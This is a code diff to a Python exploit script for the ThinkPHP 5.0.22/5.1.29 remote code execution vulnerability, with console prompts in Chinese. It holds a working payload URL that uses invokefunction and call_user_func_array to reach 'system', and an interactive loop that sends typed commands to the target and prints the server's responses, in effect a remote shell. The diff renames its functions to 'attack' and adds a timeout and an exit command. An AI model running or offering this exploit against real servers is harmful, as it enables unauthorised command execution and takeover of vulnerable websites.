@@ -15,24 +15,23 @@ def verify(url):
             relsult['method'] = 'GET'
             relsult['url'] = url
             relsult['payload'] = payload
-            relsult['exp'] = True
+            relsult['attack'] = True
         return relsult
     except:
         return relsult
 
 # getshell
-def exp():
-    url = input('输入目标URL:')
+def attack(url):
     basic_payload = url + r'''/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='''
     if verify(url):
         print('[+] 存在 Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability')
-        while True:
-            cmd_shell = input('[+] 执行命令:')
+        print('[+] 开始执行命令, 输入exit推出')
+        cmd_shell = ''
+        while cmd_shell != 'exit':
+            cmd_shell = str(input('[+] 执行命令:'))
             payload = basic_payload + cmd_shell
-            response = requests.get(payload, verify=False)
-            print(response.text)
-            output = re.search(r'<body>(.*)</body>', response.text)
-            print(output)
-
-if __name__ == '__main__':
-    exp()
+            response = requests.get(payload, verify=False, timeout=3)
+            print('[*] 执行结果:\n', response.text)
+        return True
+    else:
+        return False
